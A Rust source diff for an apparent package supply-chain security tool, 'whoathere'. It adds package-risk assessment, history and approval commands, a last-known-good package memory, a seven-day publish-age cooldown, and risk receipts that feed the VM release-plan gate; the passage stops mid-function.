@@ -156,6 +156,7 @@ pub enum Command {
         native_marker: bool,
         editable: bool,
         evidence: LocalEvidenceFlags,
+        package_risk_receipt: Option<String>,
         json: bool,
     },
     VmCanaries {
@@ -178,6 +179,24 @@ pub enum Command {
         ecosystem: Option<String>,
         timeout_seconds: Option<u64>,
         execute: bool,
+        json: bool,
+    },
+    PackageRiskAssess {
+        workspace: Option<String>,
+        ecosystem: Option<String>,
+        state_dir: Option<String>,
+        json: bool,
+    },
+    PackageRiskHistory {
+        package: Option<String>,
+        ecosystem: Option<String>,
+        state_dir: Option<String>,
+        json: bool,
+    },
+    PackageRiskApprove {
+        receipt: Option<String>,
+        reason: Option<String>,
+        state_dir: Option<String>,
         json: bool,
     },
     PolicyExplain {
@@ -677,6 +696,7 @@ pub fn parse_command(args: &[String]) -> Command {
             native_marker: rest.iter().any(|arg| arg == "--native-marker"),
             editable: rest.iter().any(|arg| arg == "--editable"),
             evidence: parse_local_evidence_flags(rest),
+            package_risk_receipt: parse_flag_value(rest, "--package-risk-receipt"),
             json: rest.iter().any(|arg| arg == "--json"),
         },
         [cmd, sub, rest @ ..] if cmd == "vm" && sub == "canaries" => Command::VmCanaries {
@@ -688,6 +708,30 @@ pub fn parse_command(args: &[String]) -> Command {
         [cmd, sub, rest @ ..] if cmd == "vm" && sub == "red-team-gate" => Command::VmRedTeamGate {
             json: rest.iter().any(|arg| arg == "--json"),
         },
+        [cmd, sub, rest @ ..] if cmd == "package-risk" && sub == "assess" => {
+            Command::PackageRiskAssess {
+                workspace: parse_flag_value(rest, "--workspace"),
+                ecosystem: parse_flag_value(rest, "--ecosystem"),
+                state_dir: parse_flag_value(rest, "--state-dir"),
+                json: rest.iter().any(|arg| arg == "--json"),
+            }
+        }
+        [cmd, sub, rest @ ..] if cmd == "package-risk" && sub == "history" => {
+            Command::PackageRiskHistory {
+                package: parse_flag_value(rest, "--package"),
+                ecosystem: parse_flag_value(rest, "--ecosystem"),
+                state_dir: parse_flag_value(rest, "--state-dir"),
+                json: rest.iter().any(|arg| arg == "--json"),
+            }
+        }
+        [cmd, sub, rest @ ..] if cmd == "package-risk" && sub == "approve" => {
+            Command::PackageRiskApprove {
+                receipt: parse_flag_value(rest, "--receipt"),
+                reason: parse_flag_value(rest, "--reason"),
+                state_dir: parse_flag_value(rest, "--state-dir"),
+                json: rest.iter().any(|arg| arg == "--json"),
+            }
+        }
         [cmd, rest @ ..] if cmd == "protect" => parse_protect(rest),
         _ => Command::Help,
     }
@@ -860,6 +904,7 @@ fn render_command_text(command: Command) -> String {
             native_marker,
             editable,
             evidence,
+            package_risk_receipt,
             json,
         } => render_vm_release_plan(VmReleasePlanArgs {
             artifact_class: artifact_class.as_deref(),
@@ -871,6 +916,7 @@ fn render_command_text(command: Command) -> String {
             native_marker,
             editable,
             evidence,
+            package_risk_receipt: package_risk_receipt.as_deref(),
             json,
         }),
         Command::VmCanaries { json } => render_vm_canaries(json),
@@ -909,6 +955,39 @@ fn render_command_text(command: Command) -> String {
             ecosystem.as_deref(),
             timeout_seconds,
             execute,
+            json,
+        ),
+        Command::PackageRiskAssess {
+            workspace,
+            ecosystem,
+            state_dir,
+            json,
+        } => render_package_risk_assess(
+            workspace.as_deref(),
+            ecosystem.as_deref(),
+            state_dir.as_deref(),
+            json,
+        ),
+        Command::PackageRiskHistory {
+            package,
+            ecosystem,
+            state_dir,
+            json,
+        } => render_package_risk_history(
+            package.as_deref(),
+            ecosystem.as_deref(),
+            state_dir.as_deref(),
+            json,
+        ),
+        Command::PackageRiskApprove {
+            receipt,
+            reason,
+            state_dir,
+            json,
+        } => render_package_risk_approve(
+            receipt.as_deref(),
+            reason.as_deref(),
+            state_dir.as_deref(),
             json,
         ),
         Command::SourceScan {
@@ -1245,7 +1324,7 @@ fn command_help() -> String {
         "|vm start|suspend|reset|prune|upgrade-local-manifest [--state-dir <dir>] [--helper <path>] [--execute]",
         "|vm health [--state-dir <dir>] [--helper <path>]",
         "|vm detonate [--workspace <path>] [--state-dir <dir>] [--helper <path>] [--fixture <name>] [--timeout-seconds <n>] [--execute] [--json] npm|pip|uv -- <args>",
-        "|vm release-plan [--class <class>|--ecosystem <name> --source <kind> --filename <name>] [--vm-ready --static-clean --dynamic-clean --egress-clean --no-canary-access --scanner-clean --diff-clean --freshness-allowed] [--json]",
+        "|vm release-plan [--class <class>|--ecosystem <name> --source <kind> --filename <name>] [--vm-ready --static-clean --dynamic-clean --egress-clean --no-canary-access --scanner-clean --diff-clean --freshness-allowed] [--package-risk-receipt <path>] [--json]",
         "|vm canaries [--json]",
         "|vm sync-policy [--json]",
         "|vm red-team-gate [--json]",
@@ -1255,6 +1334,9 @@ fn command_help() -> String {
         "|scanners list [--json]",
         "|scanners bootstrap-plan [--json]",
         "|scanners run --workspace <path> [--ecosystem auto|npm|pypi] [--timeout-seconds <n>] [--execute] [--json]",
+        "|package-risk assess --workspace <path> [--ecosystem auto|npm|pypi|uv] [--state-dir <dir>] [--json]",
+        "|package-risk history --package <name> --ecosystem <npm|pypi|uv> [--state-dir <dir>] [--json]",
+        "|package-risk approve --receipt <path> --reason <text> [--state-dir <dir>] [--json]",
         "|source scan <kind> <path> --vault-origin <url>",
         "|source scan-workspace <path> --vault-origin <url>",
         "|source context <tool> --vault-origin <url>",
@@ -6782,6 +6864,7 @@ struct VmReleasePlanArgs<'a> {
     native_marker: bool,
     editable: bool,
     evidence: LocalEvidenceFlags,
+    package_risk_receipt: Option<&'a str>,
     json: bool,
 }
 
@@ -6926,6 +7009,9 @@ fn macos_local_release_readiness(
             "host.sync_back.local_beta_allowlist",
             "vm.fixture_detonation",
             "vm.release_plan.admission_model",
+            "package_risk.local_memory",
+            "package_risk.last_known_good",
+            "package_risk.cooldown_and_diff_gates",
         ]),
         fail_closed_workflows: string_vec(&[
             "npm.install.project.live_until_guest_toolchain_proven",
@@ -6996,6 +7082,9 @@ fn render_doctor(json: bool, state_dir: Option<&str>, helper_path: Option<&str>)
         .filter(|item| item.spec.role == ScannerExecutionRole::Core)
         .count();
     let scanner_public_package_auto_trust_ready = scanner_available == scanner_required;
+    let package_memory_ready = package_risk_memory_ready(&config.state_dir);
+    let package_risk_gate_ready = true;
+    let package_reputation_support = "local_metadata_only";
     let readiness = macos_local_release_readiness(
         &status,
         MacosLocalReleaseEvidence {
@@ -7040,7 +7129,7 @@ fn render_doctor(json: bool, state_dir: Option<&str>, helper_path: Option<&str>)
             .collect::<Vec<_>>()
             .join(", ");
         return format!(
-            "{{\n  \"command\": \"whoathere doctor\",\n  \"status\": \"ok\",\n  \"release_target\": {},\n  \"release_claim\": {},\n  \"sandbox_label\": {},\n  \"high_risk_allowed\": {},\n  \"state_dir\": {},\n  \"vm_manifest_path\": {},\n  \"vm_manifest_load_reason\": {},\n  \"guest_provisioning\": {},\n  \"runtime_shutdown\": {},\n  \"release_validation\": {},\n  \"sync_validation\": {},\n  \"release_notarization\": {},\n  \"guest_reprovision_required\": {},\n  \"guest_reprovision_admin_required\": {},\n  \"guest_reprovision_operator_action\": {},\n  \"guest_reprovision_command\": {},\n  \"release_readiness_schema\": {},\n  \"release_stage\": {},\n  \"release_ready\": {},\n  \"release_blocking_reason_codes\": {},\n  \"scanner_release_blocking\": {},\n  \"scanner_release_scope\": {},\n  \"scanner_bootstrap_receipt_present\": {},\n  \"scanner_bootstrap_receipt_path\": {},\n  \"scanner_public_package_auto_trust_ready\": {},\n  \"package_acquisition_policy\": {},\n  \"implemented_workflows\": {},\n  \"fail_closed_workflows\": {},\n  \"manual_review_classes\": {},\n  \"next_actions\": {},\n  \"vm_lifecycle_ready\": {},\n  \"vm_lifecycle_reason_codes\": {},\n  \"vm_runtime_ready\": {},\n  \"vm_ready\": {},\n  \"vm_reason_codes\": {},\n  \"helper_path\": {},\n  \"helper_available\": {},\n  \"helper_exit_code\": {},\n  \"helper_reason_codes\": {},\n  \"helper_stdout_truncated\": {},\n  \"helper_stderr_truncated\": {},\n  \"helper_stdout\": {},\n  \"helper_stderr\": {},\n  \"scanner_available_count\": {},\n  \"scanner_required_count\": {},\n  \"scanners\": [{}]\n}}",
+            "{{\n  \"command\": \"whoathere doctor\",\n  \"status\": \"ok\",\n  \"release_target\": {},\n  \"release_claim\": {},\n  \"sandbox_label\": {},\n  \"high_risk_allowed\": {},\n  \"state_dir\": {},\n  \"vm_manifest_path\": {},\n  \"vm_manifest_load_reason\": {},\n  \"guest_provisioning\": {},\n  \"runtime_shutdown\": {},\n  \"release_validation\": {},\n  \"sync_validation\": {},\n  \"release_notarization\": {},\n  \"guest_reprovision_required\": {},\n  \"guest_reprovision_admin_required\": {},\n  \"guest_reprovision_operator_action\": {},\n  \"guest_reprovision_command\": {},\n  \"release_readiness_schema\": {},\n  \"release_stage\": {},\n  \"release_ready\": {},\n  \"release_blocking_reason_codes\": {},\n  \"scanner_release_blocking\": {},\n  \"scanner_release_scope\": {},\n  \"scanner_bootstrap_receipt_present\": {},\n  \"scanner_bootstrap_receipt_path\": {},\n  \"scanner_public_package_auto_trust_ready\": {},\n  \"package_memory_ready\": {},\n  \"package_memory_path\": {},\n  \"package_risk_gate_ready\": {},\n  \"package_age_gate_days\": {},\n  \"package_diff_supported\": {},\n  \"package_reputation_support\": {},\n  \"package_acquisition_policy\": {},\n  \"implemented_workflows\": {},\n  \"fail_closed_workflows\": {},\n  \"manual_review_classes\": {},\n  \"next_actions\": {},\n  \"vm_lifecycle_ready\": {},\n  \"vm_lifecycle_reason_codes\": {},\n  \"vm_runtime_ready\": {},\n  \"vm_ready\": {},\n  \"vm_reason_codes\": {},\n  \"helper_path\": {},\n  \"helper_available\": {},\n  \"helper_exit_code\": {},\n  \"helper_reason_codes\": {},\n  \"helper_stdout_truncated\": {},\n  \"helper_stderr_truncated\": {},\n  \"helper_stdout\": {},\n  \"helper_stderr\": {},\n  \"scanner_available_count\": {},\n  \"scanner_required_count\": {},\n  \"scanners\": [{}]\n}}",
             json_string(RELEASE_TARGET),
             json_string(RELEASE_CLAIM),
             json_string(plan.label),
@@ -7072,6 +7161,12 @@ fn render_doctor(json: bool, state_dir: Option<&str>, helper_path: Option<&str>)
             scanner_bootstrap_receipt_present(),
             json_string(&redacted_path_string(&scanner_bootstrap_receipt_path())),
             scanner_public_package_auto_trust_ready,
+            package_memory_ready,
+            json_string(&redacted_package_risk_path(&package_risk_store_path(&config.state_dir))),
+            package_risk_gate_ready,
+            PACKAGE_RISK_COOLDOWN_DAYS,
+            true,
+            json_string(package_reputation_support),
             json_string(readiness.package_acquisition_policy),
             json_string_array(&readiness.implemented_workflows),
             json_string_array(&readiness.fail_closed_workflows),
@@ -7119,7 +7214,7 @@ fn render_doctor(json: bool, state_dir: Option<&str>, helper_path: Option<&str>)
         .collect::<Vec<_>>()
         .join("\n");
     format!(
-        "whoathere doctor\nstatus=ok\nrelease_target={}\nrelease_claim={}\nsandbox_label={}\nhigh_risk_allowed={}\nstate_dir={}\nvm_manifest_path={}\nvm_manifest_load_reason={}\n{}\n{}\n{}\n{}\n{}\nguest_reprovision_required={}\nguest_reprovision_admin_required={}\nguest_reprovision_operator_action={}\nguest_reprovision_command={}\nrelease_readiness_schema={}\nrelease_stage={}\nrelease_ready={}\nrelease_blocking_reason_codes={:?}\nscanner_release_blocking={}\nscanner_release_scope={}\nscanner_bootstrap_receipt_present={}\nscanner_bootstrap_receipt_path={}\nscanner_public_package_auto_trust_ready={}\npackage_acquisition_policy={}\nimplemented_workflows={:?}\nfail_closed_workflows={:?}\nmanual_review_classes={:?}\nnext_actions={:?}\nvm_lifecycle_ready={}\nvm_lifecycle_reason_codes={:?}\nvm_runtime_ready={}\nvm_ready={}\nvm_reason_codes={:?}\n{}\nscanner_available_count={}\nscanner_required_count={}\n{}",
+        "whoathere doctor\nstatus=ok\nrelease_target={}\nrelease_claim={}\nsandbox_label={}\nhigh_risk_allowed={}\nstate_dir={}\nvm_manifest_path={}\nvm_manifest_load_reason={}\n{}\n{}\n{}\n{}\n{}\nguest_reprovision_required={}\nguest_reprovision_admin_required={}\nguest_reprovision_operator_action={}\nguest_reprovision_command={}\nrelease_readiness_schema={}\nrelease_stage={}\nrelease_ready={}\nrelease_blocking_reason_codes={:?}\nscanner_release_blocking={}\nscanner_release_scope={}\nscanner_bootstrap_receipt_present={}\nscanner_bootstrap_receipt_path={}\nscanner_public_package_auto_trust_ready={}\npackage_memory_ready={}\npackage_memory_path={}\npackage_risk_gate_ready={}\npackage_age_gate_days={}\npackage_diff_supported=true\npackage_reputation_support={}\npackage_acquisition_policy={}\nimplemented_workflows={:?}\nfail_closed_workflows={:?}\nmanual_review_classes={:?}\nnext_actions={:?}\nvm_lifecycle_ready={}\nvm_lifecycle_reason_codes={:?}\nvm_runtime_ready={}\nvm_ready={}\nvm_reason_codes={:?}\n{}\nscanner_available_count={}\nscanner_required_count={}\n{}",
         RELEASE_TARGET,
         RELEASE_CLAIM,
         plan.label,
@@ -7147,6 +7242,11 @@ fn render_doctor(json: bool, state_dir: Option<&str>, helper_path: Option<&str>)
         scanner_bootstrap_receipt_present(),
         redacted_path_string(&scanner_bootstrap_receipt_path()),
         scanner_public_package_auto_trust_ready,
+        package_memory_ready,
+        redacted_package_risk_path(&package_risk_store_path(&config.state_dir)),
+        package_risk_gate_ready,
+        PACKAGE_RISK_COOLDOWN_DAYS,
+        package_reputation_support,
         readiness.package_acquisition_policy,
         readiness.implemented_workflows,
         readiness.fail_closed_workflows,
@@ -7181,11 +7281,13 @@ fn render_vm_release_plan(args: VmReleasePlanArgs<'_>) -> String {
             );
         }
     };
-    let decision = decide_local_sync(package_class, &args.evidence);
+    let (effective_evidence, package_risk_receipt) =
+        apply_package_risk_receipt(args.evidence.clone(), args.package_risk_receipt);
+    let decision = decide_local_sync(package_class, &effective_evidence);
     let exit_code = local_admission_exit_code(decision.verdict);
     if args.json {
         return format!(
-            "{{\n  \"command\": \"whoathere vm release-plan\",\n  \"release_target\": {},\n  \"release_claim\": {},\n  \"vm_boundary\": {},\n  \"network_model\": {},\n  \"sync_policy\": {},\n  \"authorization\": false,\n  \"sync_authorized\": false,\n  \"authorization_reason\": \"release_plan_is_not_runtime_verdict\",\n  \"package_class\": {},\n  \"verdict\": {},\n  \"auto_sync_eligible\": {},\n  \"sync_paths\": {},\n  \"required_evidence\": {},\n  \"reason_codes\": {},\n  \"evidence\": {{\"vm_ready\": {}, \"static_clean\": {}, \"dynamic_clean\": {}, \"egress_clean\": {}, \"no_canary_access\": {}, \"scanner_clean\": {}, \"diff_clean_or_baseline_absent\": {}, \"freshness_allowed\": {}}},\n  \"exit_code\": {exit_code}\n}}",
+            "{{\n  \"command\": \"whoathere vm release-plan\",\n  \"release_target\": {},\n  \"release_claim\": {},\n  \"vm_boundary\": {},\n  \"network_model\": {},\n  \"sync_policy\": {},\n  \"authorization\": false,\n  \"sync_authorized\": false,\n  \"authorization_reason\": \"release_plan_is_not_runtime_verdict\",\n  \"package_class\": {},\n  \"verdict\": {},\n  \"auto_sync_eligible\": {},\n  \"sync_paths\": {},\n  \"required_evidence\": {},\n  \"reason_codes\": {},\n  \"package_risk_receipt\": {},\n  \"package_risk_receipt_applied\": {},\n  \"package_risk_reason_codes\": {},\n  \"evidence\": {{\"vm_ready\": {}, \"static_clean\": {}, \"dynamic_clean\": {}, \"egress_clean\": {}, \"no_canary_access\": {}, \"scanner_clean\": {}, \"diff_clean_or_baseline_absent\": {}, \"freshness_allowed\": {}}},\n  \"exit_code\": {exit_code}\n}}",
             json_string(RELEASE_TARGET),
             json_string(RELEASE_CLAIM),
             json_string(VM_BOUNDARY),
@@ -7209,18 +7311,25 @@ fn render_vm_release_plan(args: VmReleasePlanArgs<'_>) -> String {
                     .collect::<Vec<_>>()
             ),
             json_string_array(&decision.reason_codes),
-            args.evidence.vm_ready,
-            args.evidence.static_clean,
-            args.evidence.dynamic_clean,
-            args.evidence.egress_clean,
-            args.evidence.no_canary_access,
-            args.evidence.scanner_clean,
-            args.evidence.diff_clean_or_baseline_absent,
-            args.evidence.freshness_allowed,
+            package_risk_receipt
+                .receipt_path
+                .as_deref()
+                .map(json_string)
+                .unwrap_or_else(|| "null".to_string()),
+            package_risk_receipt.applied,
+            json_string_array(&package_risk_receipt.reason_codes),
+            effective_evidence.vm_ready,
+            effective_evidence.static_clean,
+            effective_evidence.dynamic_clean,
+            effective_evidence.egress_clean,
+            effective_evidence.no_canary_access,
+            effective_evidence.scanner_clean,
+            effective_evidence.diff_clean_or_baseline_absent,
+            effective_evidence.freshness_allowed,
         );
     }
     format!(
-        "whoathere vm release-plan\nrelease_target={}\nrelease_claim={}\nvm_boundary={}\nnetwork_model={}\nsync_policy={}\nauthorization=false\nsync_authorized=false\nauthorization_reason=release_plan_is_not_runtime_verdict\npackage_class={}\nverdict={}\nauto_sync_eligible={}\nsync_paths={:?}\nrequired_evidence={:?}\nreason_codes={:?}\nevidence_vm_ready={}\nevidence_static_clean={}\nevidence_dynamic_clean={}\nevidence_egress_clean={}\nevidence_no_canary_access={}\nevidence_scanner_clean={}\nevidence_diff_clean_or_baseline_absent={}\nevidence_freshness_allowed={}\nexit_code={exit_code}",
+        "whoathere vm release-plan\nrelease_target={}\nrelease_claim={}\nvm_boundary={}\nnetwork_model={}\nsync_policy={}\nauthorization=false\nsync_authorized=false\nauthorization_reason=release_plan_is_not_runtime_verdict\npackage_class={}\nverdict={}\nauto_sync_eligible={}\nsync_paths={:?}\nrequired_evidence={:?}\nreason_codes={:?}\npackage_risk_receipt={}\npackage_risk_receipt_applied={}\npackage_risk_reason_codes={:?}\nevidence_vm_ready={}\nevidence_static_clean={}\nevidence_dynamic_clean={}\nevidence_egress_clean={}\nevidence_no_canary_access={}\nevidence_scanner_clean={}\nevidence_diff_clean_or_baseline_absent={}\nevidence_freshness_allowed={}\nexit_code={exit_code}",
         RELEASE_TARGET,
         RELEASE_CLAIM,
         VM_BOUNDARY,
@@ -7232,14 +7341,83 @@ fn render_vm_release_plan(args: VmReleasePlanArgs<'_>) -> String {
         decision.sync_paths,
         decision.required_evidence,
         decision.reason_codes,
-        args.evidence.vm_ready,
-        args.evidence.static_clean,
-        args.evidence.dynamic_clean,
-        args.evidence.egress_clean,
-        args.evidence.no_canary_access,
-        args.evidence.scanner_clean,
-        args.evidence.diff_clean_or_baseline_absent,
-        args.evidence.freshness_allowed,
+        package_risk_receipt.receipt_path.as_deref().unwrap_or("none"),
+        package_risk_receipt.applied,
+        package_risk_receipt.reason_codes,
+        effective_evidence.vm_ready,
+        effective_evidence.static_clean,
+        effective_evidence.dynamic_clean,
+        effective_evidence.egress_clean,
+        effective_evidence.no_canary_access,
+        effective_evidence.scanner_clean,
+        effective_evidence.diff_clean_or_baseline_absent,
+        effective_evidence.freshness_allowed,
+    )
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct PackageRiskReceiptApplication {
+    receipt_path: Option<String>,
+    applied: bool,
+    reason_codes: Vec<String>,
+}
+
+fn apply_package_risk_receipt(
+    mut evidence: LocalEvidenceFlags,
+    receipt_path: Option<&str>,
+) -> (LocalEvidenceFlags, PackageRiskReceiptApplication) {
+    let Some(receipt_path) = receipt_path else {
+        return (
+            evidence,
+            PackageRiskReceiptApplication {
+                receipt_path: None,
+                applied: false,
+                reason_codes: vec!["package_risk_receipt_not_provided".to_string()],
+            },
+        );
+    };
+    let redacted_path = redacted_package_risk_path(Path::new(receipt_path));
+    let contents = match std::fs::read_to_string(receipt_path) {
+        Ok(contents) => contents,
+        Err(_) => {
+            evidence.diff_clean_or_baseline_absent = false;
+            evidence.freshness_allowed = false;
+            return (
+                evidence,
+                PackageRiskReceiptApplication {
+                    receipt_path: Some(redacted_path),
+                    applied: false,
+                    reason_codes: vec!["package_risk_receipt_unreadable".to_string()],
+                },
+            );
+        }
+    };
+    let diff_clean =
+        json_extract_bool_field(&contents, "all_diff_clean_or_baseline_absent").unwrap_or(false);
+    let freshness_allowed =
+        json_extract_bool_field(&contents, "all_freshness_allowed").unwrap_or(false);
+    evidence.diff_clean_or_baseline_absent = diff_clean;
+    evidence.freshness_allowed = freshness_allowed;
+    let mut reason_codes = json_extract_string_array_field(&contents, "reason_codes");
+    if diff_clean {
+        reason_codes.push("package_risk_diff_receipt_clean".to_string());
+    } else {
+        reason_codes.push("package_risk_diff_receipt_not_clean".to_string());
+    }
+    if freshness_allowed {
+        reason_codes.push("package_risk_freshness_receipt_allowed".to_string());
+    } else {
+        reason_codes.push("package_risk_freshness_receipt_not_allowed".to_string());
+    }
+    reason_codes.sort();
+    reason_codes.dedup();
+    (
+        evidence,
+        PackageRiskReceiptApplication {
+            receipt_path: Some(redacted_path),
+            applied: true,
+            reason_codes,
+        },
     )
 }
 
@@ -7311,9 +7489,10 @@ fn render_vm_sync_policy(json: bool) -> String {
             .collect::<Vec<_>>()
             .join(", ");
         return format!(
-            "{{\n  \"command\": \"whoathere vm sync-policy\",\n  \"release_target\": {},\n  \"sync_policy\": {},\n  \"sync_back_enabled\": true,\n  \"policy_scope\": \"local_beta_allowlist_requires_clean_vm_evidence_and_current_sync_receipt\",\n  \"auto_sync_classes\": [\"npm.local_project.no_external_dependency\", \"pypi.local_project.pure_python\", \"uv.local_project.pure_python\"],\n  \"deny_default_classes\": [\"direct_vcs_editable.v1\", \"unsupported_unknown.v1\"],\n  \"manual_review_classes\": [\"pypi.sdist_pep517.v1\", \"pypi.binary_wheel.v1\", \"native_extension.v1\"],\n  \"sync_allowlist\": [{}],\n  \"required_evidence\": {},\n  \"scanner_adapters\": [{}]\n}}",
+            "{{\n  \"command\": \"whoathere vm sync-policy\",\n  \"release_target\": {},\n  \"sync_policy\": {},\n  \"sync_back_enabled\": true,\n  \"policy_scope\": \"local_beta_allowlist_requires_clean_vm_evidence_and_current_sync_receipt\",\n  \"auto_sync_classes\": [\"npm.local_project.no_external_dependency\", \"pypi.local_project.pure_python\", \"uv.local_project.pure_python\"],\n  \"deny_default_classes\": [\"direct_vcs_editable.v1\", \"unsupported_unknown.v1\"],\n  \"manual_review_classes\": [\"pypi.sdist_pep517.v1\", \"pypi.binary_wheel.v1\", \"native_extension.v1\"],\n  \"package_risk_required_for_public_auto_sync\": true,\n  \"package_age_gate_days\": {},\n  \"package_risk_receipt_fields\": [\"all_freshness_allowed\", \"all_diff_clean_or_baseline_absent\"],\n  \"sync_allowlist\": [{}],\n  \"required_evidence\": {},\n  \"scanner_adapters\": [{}]\n}}",
             json_string(RELEASE_TARGET),
             json_string(SYNC_POLICY),
+            PACKAGE_RISK_COOLDOWN_DAYS,
             rule_json,
             json_string_array(&evidence.iter().map(|item| (*item).to_string()).collect::<Vec<_>>()),
             scanner_json
@@ -7340,8 +7519,8 @@ fn render_vm_sync_policy(json: bool) -> String {
         .collect::<Vec<_>>()
         .join("\n");
     format!(
-        "whoathere vm sync-policy\nrelease_target={}\nsync_policy={}\nsync_back_enabled=true\npolicy_scope=local_beta_allowlist_requires_clean_vm_evidence_and_current_sync_receipt\nauto_sync_classes=[\"npm.local_project.no_external_dependency\", \"pypi.local_project.pure_python\", \"uv.local_project.pure_python\"]\nmanual_review_classes=[\"pypi.sdist_pep517.v1\", \"pypi.binary_wheel.v1\", \"native_extension.v1\"]\ndeny_default_classes=[\"direct_vcs_editable.v1\", \"unsupported_unknown.v1\"]\nrequired_evidence={:?}\n{}\n{}",
-        RELEASE_TARGET, SYNC_POLICY, evidence, rule_rows, scanner_rows
+        "whoathere vm sync-policy\nrelease_target={}\nsync_policy={}\nsync_back_enabled=true\npolicy_scope=local_beta_allowlist_requires_clean_vm_evidence_and_current_sync_receipt\nauto_sync_classes=[\"npm.local_project.no_external_dependency\", \"pypi.local_project.pure_python\", \"uv.local_project.pure_python\"]\nmanual_review_classes=[\"pypi.sdist_pep517.v1\", \"pypi.binary_wheel.v1\", \"native_extension.v1\"]\ndeny_default_classes=[\"direct_vcs_editable.v1\", \"unsupported_unknown.v1\"]\npackage_risk_required_for_public_auto_sync=true\npackage_age_gate_days={}\npackage_risk_receipt_fields=[\"all_freshness_allowed\", \"all_diff_clean_or_baseline_absent\"]\nrequired_evidence={:?}\n{}\n{}",
+        RELEASE_TARGET, SYNC_POLICY, PACKAGE_RISK_COOLDOWN_DAYS, evidence, rule_rows, scanner_rows
     )
 }
 
@@ -9575,6 +9754,1629 @@ fn redacted_path_string(path: &Path) -> String {
         return "<redacted-path>".to_string();
     }
     value
+}
+
+const PACKAGE_RISK_ASSESSMENT_SCHEMA: &str = "whoathere.package_risk_assessment.v1";
+const PACKAGE_RISK_STORE_SCHEMA: &str = "whoathere.package_risk_store_record.v1";
+const PACKAGE_RISK_COOLDOWN_DAYS: u64 = 7;
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PackageRiskEcosystem {
+    Auto,
+    Npm,
+    Pypi,
+    Uv,
+}
+
+impl PackageRiskEcosystem {
+    fn parse(value: &str) -> Option<Self> {
+        match value {
+            "auto" => Some(Self::Auto),
+            "npm" => Some(Self::Npm),
+            "pypi" | "pip" | "python" => Some(Self::Pypi),
+            "uv" => Some(Self::Uv),
+            _ => None,
+        }
+    }
+
+    fn as_str(self) -> &'static str {
+        match self {
+            Self::Auto => "auto",
+            Self::Npm => "npm",
+            Self::Pypi => "pypi",
+            Self::Uv => "uv",
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PackageRiskVerdict {
+    AutoSyncCandidate,
+    ManualReview,
+    Deny,
+}
+
+impl PackageRiskVerdict {
+    fn as_str(self) -> &'static str {
+        match self {
+            Self::AutoSyncCandidate => "auto_sync_candidate",
+            Self::ManualReview => "manual_review",
+            Self::Deny => "deny",
+        }
+    }
+
+    fn exit_code(self) -> i32 {
+        match self {
+            Self::AutoSyncCandidate => ExitCode::Allow.code(),
+            Self::ManualReview => ExitCode::ManualReview.code(),
+            Self::Deny => ExitCode::Deny.code(),
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct PackageRiskSubject {
+    ecosystem: PackageRiskEcosystem,
+    package_name: String,
+    requested_spec: String,
+    resolved_version: Option<String>,
+    source_kind: String,
+    package_class: PackageClass,
+    artifact_hash: String,
+    pinned: bool,
+    publish_age_days: Option<u64>,
+    reputation_status: String,
+    indicators: Vec<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct PackageRiskAssessment {
+    ecosystem: PackageRiskEcosystem,
+    package_name: String,
+    requested_spec: String,
+    resolved_version: Option<String>,
+    selected_version: Option<String>,
+    source_kind: String,
+    package_class: PackageClass,
+    artifact_hash: String,
+    pinned: bool,
+    last_known_good_version: Option<String>,
+    last_known_good_hash: Option<String>,
+    last_known_good_used: bool,
+    publish_age_days: Option<u64>,
+    freshness_allowed: bool,
+    diff_clean_or_baseline_absent: bool,
+    reputation_status: String,
+    indicators: Vec<String>,
+    verdict: PackageRiskVerdict,
+    reason_codes: Vec<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct PackageRiskMemoryRecord {
+    record_kind: String,
+    ecosystem: PackageRiskEcosystem,
+    package_name: String,
+    requested_spec: String,
+    resolved_version: Option<String>,
+    selected_version: Option<String>,
+    source_kind: String,
+    package_class: String,
+    artifact_hash: String,
+    verdict: String,
+    approved: bool,
+    created_at_unix_seconds: u64,
+    receipt_id: String,
+    reason_codes: Vec<String>,
+    diff_clean_or_baseline_absent: bool,
+    freshness_allowed: bool,
+}
+
+fn render_package_risk_assess(
+    workspace: Option<&str>,
+    ecosystem: Option<&str>,
+    state_dir: Option<&str>,
+    json: bool,
+) -> String {
+    let Some(workspace) = workspace else {
+        return package_risk_error("package_risk_workspace_required", json);
+    };
+    let requested_ecosystem = match PackageRiskEcosystem::parse(ecosystem.unwrap_or("auto")) {
+        Some(parsed) => parsed,
+        None => return package_risk_error("package_risk_ecosystem_invalid", json),
+    };
+    let workspace_path = Path::new(workspace);
+    if !workspace_path.is_dir() {
+        return package_risk_error("package_risk_workspace_not_directory", json);
+    }
+
+    let config = macos_vm_config(state_dir, None, None);
+    let memory = load_package_risk_memory(&config.state_dir);
+    let subjects = discover_package_risk_subjects(workspace_path, requested_ecosystem);
+    let receipt_id = package_risk_receipt_id(workspace_path, current_unix_seconds());
+    let assessments = subjects
+        .iter()
+        .map(|subject| assess_package_risk_subject(subject, &memory))
+        .collect::<Vec<_>>();
+    let all_freshness_allowed = !assessments.is_empty()
+        && assessments
+            .iter()
+            .all(|assessment| assessment.freshness_allowed);
+    let all_diff_clean_or_baseline_absent = !assessments.is_empty()
+        && assessments
+            .iter()
+            .all(|assessment| assessment.diff_clean_or_baseline_absent);
+    let overall_verdict = package_risk_overall_verdict(&assessments);
+    let mut summary_reasons = package_risk_summary_reasons(&assessments);
+    if assessments.is_empty() {
+        summary_reasons.push("package_risk_no_supported_subjects".to_string());
+    }
+
+    let receipt_path = package_risk_receipt_path(&config.state_dir, &receipt_id);
+    let receipt_write_status = write_package_risk_receipt(PackageRiskReceiptWrite {
+        path: &receipt_path,
+        receipt_id: &receipt_id,
+        requested_ecosystem,
+        assessments: &assessments,
+        all_freshness_allowed,
+        all_diff_clean_or_baseline_absent,
+        overall_verdict,
+        reason_codes: &summary_reasons,
+    });
+    let mut store_status = "ok".to_string();
+    if receipt_write_status == "ok" {
+        for assessment in &assessments {
+            if let Err(error) = append_package_risk_store_record(
+                &config.state_dir,
+                &package_risk_assessment_store_record(assessment, &receipt_id, false),
+            ) {
+                store_status = format!("error:{error}");
+                break;
+            }
+        }
+    }
+
+    render_package_risk_assessment_summary(PackageRiskSummaryRender {
+        requested_ecosystem,
+        state_dir: &config.state_dir,
+        receipt_path: &receipt_path,
+        receipt_id: &receipt_id,
+        assessments: &assessments,
